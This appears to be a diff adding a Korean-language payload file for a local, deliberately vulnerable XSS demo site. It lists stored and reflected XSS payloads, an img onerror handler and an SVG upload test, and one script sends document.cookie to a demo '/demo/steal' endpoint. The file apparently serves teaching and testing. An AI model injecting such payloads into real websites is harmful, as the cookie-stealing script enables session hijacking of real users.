@@ -1,0 +1,17 @@
+# XSS 공격 페이로드
+# 데모 페이지: http://localhost:8080/demo/xss
+
+## [저장형 XSS — 취약 댓글] 기본 alert
+<script>alert('XSS!')</script>
+
+## [저장형 XSS — 취약 댓글] 쿠키 탈취 → /demo/steal 에서 확인
+<script>fetch('/demo/steal?c='+document.cookie)</script>
+
+## [저장형 XSS — 취약 댓글] 이미지 태그 이벤트 핸들러
+<img src=x onerror="alert('XSS')">
+
+## [반사형 XSS — 취약 반사형 폼]
+<script>alert(1)</script>
+
+## [파일 업로드 XSS]
+# xss.svg 파일을 /demo/file-upload [취약] 업로드 폼에 올려서 테스트
